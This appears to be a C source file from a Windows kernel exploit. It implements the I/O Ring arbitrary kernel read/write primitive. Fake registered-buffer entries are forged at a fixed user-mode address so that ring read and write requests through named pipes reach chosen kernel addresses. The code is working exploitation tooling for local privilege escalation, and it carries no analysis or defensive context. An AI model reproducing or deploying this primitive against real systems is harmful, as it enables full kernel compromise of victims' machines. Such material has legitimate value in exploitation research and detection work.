#include "general.h"

HIORING ioRingHandle = NULL;
PIORING_OBJECT ioRingObject = NULL;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputPipeFile = INVALID_HANDLE_VALUE;
HANDLE outputPipeFile = INVALID_HANDLE_VALUE;

const PVOID targetAddress = (PVOID)0x1000000;
PVOID fakeRegBuffer = 0;

BOOL IoRingSetup(PIORING_OBJECT* ioRingObjectPointer)
{
	IORING_CREATE_FLAGS ioRingFlags = { 0 };
	ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

	HRESULT status = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &ioRingHandle);
	if (status != S_OK)
		return FALSE;

	BOOL objectStatus = UtilsGetObjectPointer(GetCurrentProcessId(), *(PHANDLE)ioRingHandle, (PULONG64)ioRingObjectPointer);
	if (!objectStatus)
		return FALSE;

	ioRingObject = *ioRingObjectPointer;

	inputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	outputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	if (inputPipe == INVALID_HANDLE_VALUE || outputPipe == INVALID_HANDLE_VALUE)
		return FALSE;

	inputPipeFile = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	outputPipeFile = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (inputPipeFile == INVALID_HANDLE_VALUE || outputPipeFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if (!fakeRegBuffer)
	{
		fakeRegBuffer = VirtualAlloc(targetAddress, sizeof(ULONG64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (fakeRegBuffer != targetAddress)
			return FALSE;
	}

	memset(fakeRegBuffer, 0, sizeof(ULONG64));
	return TRUE;
}

BOOL IoRingRead(PULONG64 registerBuffers, ULONG64 readAddress, PVOID readBuffer, ULONG readLength)
{
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(outputPipeFile);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	PIOP_MC_BUFFER_ENTRY bufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return FALSE;

	bufferEntry->Address = (PVOID)readAddress;
	bufferEntry->Length = readLength;
	bufferEntry->Type = 0xc02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	registerBuffers[0] = (ULONG64)bufferEntry;

	HRESULT status = BuildIoRingWriteFile(ioRingHandle, reqFile, reqBuffer, readLength, 0, FILE_WRITE_FLAGS_NONE, (UINT_PTR)NULL, IOSQE_FLAGS_NONE);
	if (status != S_OK)
		return FALSE;

	status = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (status != S_OK)
		return FALSE;

	status = PopIoRingCompletion(ioRingHandle, &cqe);
	if (status != S_OK)
		return FALSE;

	if (cqe.ResultCode != S_OK)
		return FALSE;

	if (!ReadFile(outputPipe, readBuffer, readLength, NULL, NULL))
		return FALSE;

	return TRUE;
}

BOOL IoRingWrite(PULONG64 registerBuffers, ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength)
{
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(inputPipeFile);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	if (!WriteFile(inputPipe, writeBuffer, writeLength, NULL, NULL))
		return FALSE;

	PIOP_MC_BUFFER_ENTRY bufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return FALSE;

	bufferEntry->Address = (PVOID)writeAddress;
	bufferEntry->Length = writeLength;
	bufferEntry->Type = 0xc02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	registerBuffers[0] = (ULONG64)bufferEntry;

	HRESULT status = BuildIoRingReadFile(ioRingHandle, reqFile, reqBuffer, writeLength, 0, (UINT_PTR)NULL, IOSQE_FLAGS_NONE);
	if (status != S_OK)
		return FALSE;

	status = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (status != S_OK)
		return FALSE;

	status = PopIoRingCompletion(ioRingHandle, &cqe);
	if (status != S_OK)
		return FALSE;

	if (cqe.ResultCode != S_OK)
		return FALSE;

	return TRUE;
}

BOOL IoRingReadHelper(ULONG64 readAddress, PVOID readBuffer, ULONG readLength)
{
	volatile _HIORING* handleStructure = *(_HIORING**)&ioRingHandle;
	handleStructure->RegBufferArray = fakeRegBuffer;
	handleStructure->BufferArraySize = 1;
	return IoRingRead(fakeRegBuffer, readAddress, readBuffer, readLength);
}

BOOL IoRingWriteHelper(ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength)
{
	volatile _HIORING* handleStructure = *(_HIORING**)&ioRingHandle;
	handleStructure->RegBufferArray = fakeRegBuffer;
	handleStructure->BufferArraySize = 1;
	return IoRingWrite(fakeRegBuffer, writeAddress, writeBuffer, writeLength);;
}

BOOL IoRingRundown()
{
	BYTE zeros[0x10] = { 0 };
	IoRingWrite(fakeRegBuffer, (ULONG64)&ioRingObject->RegBuffersCount, &zeros, 0x10);
	return TRUE;
}